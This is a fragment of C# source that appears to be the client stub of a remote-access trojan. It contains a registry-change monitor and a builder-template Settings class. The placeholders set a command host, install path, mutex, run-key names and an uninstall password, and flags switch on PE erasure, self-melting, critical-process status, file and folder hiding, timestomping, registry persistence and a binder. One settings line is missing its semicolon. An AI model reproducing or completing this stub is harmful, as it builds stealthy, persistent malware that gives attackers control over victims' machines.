        private ManualResetEvent _eventTerminate = new ManualResetEvent(false);

        private RegChangeNotifyFilter _regFilter = RegChangeNotifyFilter.Key | RegChangeNotifyFilter.Attribute |
                                                   RegChangeNotifyFilter.Value | RegChangeNotifyFilter.Security;

        #endregion
        public RegistryMonitor(RegistryKey registryKey)
        {
            InitRegistryKey(registryKey.Name);
        }
        public RegistryMonitor(string name)
        {

            InitRegistryKey(name);
        }

        public RegistryMonitor(RegistryHive registryHive, string subKey)
        {
            InitRegistryKey(registryHive, subKey);
        }

        public void Dispose()
        {
            Stop();
            GC.SuppressFinalize(this);
        }

        public RegChangeNotifyFilter RegChangeNotifyFilter
        {
            get { return _regFilter; }
            set
            {
                lock (_threadLock)
                {
                    _regFilter = value;
                }
            }
        }

        #region Initialization

        private void InitRegistryKey(RegistryHive hive, string name)
        {
            switch (hive)
            {
                case RegistryHive.ClassesRoot:
                    _registryHive = HKEY_CLASSES_ROOT;
                    break;

                case RegistryHive.CurrentConfig:
                    _registryHive = HKEY_CURRENT_CONFIG;
                    break;

                case RegistryHive.CurrentUser:
                    _registryHive = HKEY_CURRENT_USER;
                    break;

                case RegistryHive.DynData:
                    _registryHive = HKEY_DYN_DATA;
                    break;

                case RegistryHive.LocalMachine:
                    _registryHive = HKEY_LOCAL_MACHINE;
                    break;

                case RegistryHive.PerformanceData:
                    _registryHive = HKEY_PERFORMANCE_DATA;
                    break;

                case RegistryHive.Users:
                    _registryHive = HKEY_USERS;
                    break;

                default:
                    break;
            }
            _registrySubName = name;
        }

        private void InitRegistryKey(string name)
        {
            string[] nameParts = name.Split('\\');

            switch (nameParts[0])
            {
                case "HKEY_CLASSES_ROOT":
                case "HKCR":
                    _registryHive = HKEY_CLASSES_ROOT;
                    break;

                case "HKEY_CURRENT_USER":
                case "HKCU":
                    _registryHive = HKEY_CURRENT_USER;
                    break;

                case "HKEY_LOCAL_MACHINE":
                case "HKLM":
                    _registryHive = HKEY_LOCAL_MACHINE;
                    break;

                case "HKEY_USERS":
                    _registryHive = HKEY_USERS;
                    break;

                case "HKEY_CURRENT_CONFIG":
                    _registryHive = HKEY_CURRENT_CONFIG;
                    break;

                default:
                    _registryHive = IntPtr.Zero;
                    break;
            }

            _registrySubName = String.Join("\\", nameParts, 1, nameParts.Length - 1);
        }

        #endregion

        public bool IsMonitoring
        {
            get { return _thread != null; }
        }
        public void Start()
        {
            lock (_threadLock)
            {
                if (!IsMonitoring)
                {
                    _eventTerminate.Reset();
                    _thread = new Thread(new ThreadStart(MonitorThread));
                    _thread.IsBackground = true;
                    _thread.Start();
                }
            }
        }
        public void Stop()
        {
            lock (_threadLock)
            {
                Thread thread = _thread;
                if (thread != null)
                {
                    _eventTerminate.Set();
                    thread.Join();
                }
            }
        }

        private void MonitorThread()
        {
            try
            {
                ThreadLoop();
            }
            catch (Exception e)
            {
                OnError(e);
            }
            _thread = null;
        }

        private void ThreadLoop()
        {
            IntPtr registryKey;
            int result = RegOpenKeyEx(_registryHive, _registrySubName, 0, STANDARD_RIGHTS_READ | KEY_QUERY_VALUE | KEY_NOTIFY,
                                      out registryKey);
            if (result != 0)
                throw new Win32Exception(result);

            try
            {
                AutoResetEvent _eventNotify = new AutoResetEvent(false);
                WaitHandle[] waitHandles = new WaitHandle[] { _eventNotify, _eventTerminate };
                while (!_eventTerminate.WaitOne(0, true))
                {
                    result = RegNotifyChangeKeyValue(registryKey, true, _regFilter, _eventNotify.SafeWaitHandle.DangerousGetHandle(), true);
                    if (result != 0)
                        throw new Win32Exception(result);

                    if (WaitHandle.WaitAny(waitHandles) == 0)
                    {
                        OnRegChanged();
                    }
                }
            }
            finally
            {
                if (registryKey != IntPtr.Zero)
                {
                    RegCloseKey(registryKey);
                }
            }
        }
    }
    [Flags]
    public enum RegChangeNotifyFilter
    {
        Key = 1,
        Attribute = 2,
        Value = 4,
        Security = 8,
    }
} //Reg Hook
namespace Client
{
    class Settings
    {
        public static string Hosts = "[HOST]";
        public static string InstallPath = "[INSTALLPATH]"
        public static string InstallName = "[INSTALLNAME]";
        public static string HKCU_RegName = "[HKCU]";
        public static string HKLM_RegName = "[HKLM]";
        public static string ActiveXKey = "{Ssdfgf-fsddf-fdsfds-fgd-gfd-gfdgfdg}";
        public static string Mutex = "[MUTEX]";
        public static string Version = "2.6";
		public static string PluginStoreName = "[PLUGINSTORENAME]";
        public static string PluginRegLocation = "[PLUGINLOC]";
        public static string UninstallPassword = "[UNINSTALLPASSWORD]";
		public static string Key = "[KEY]";

        public static int ConnectionTimeout = [TIMEOUT];

        public static bool Install = [INSTALL];
        public static bool HKCU = [IHKCU];
        public static bool HKLM = [IHKLM];
        public static bool ActiveX = [ACTIVEX];
        public static bool Visible = [VISIBLE];
        public static bool ErasePE = [EPE];
        public static bool CheckParent = [CHECKP];
        public static bool SetCrit = [SETCRIT];
        public static bool HideFolder = [HIDEFOLDER];
        public static bool HideFile = [HIDEFILE];
        public static bool Melt = [MELT];
        public static bool ChangeCreation = [CHANGECREATION];
		public static bool RegistryPersis = [REGPRES];
		public static bool Binder = [BINDER];

        public static RegistryHive PluginRegHive = RegistryHive.[PLUGINHIVE];
    }
} //Settings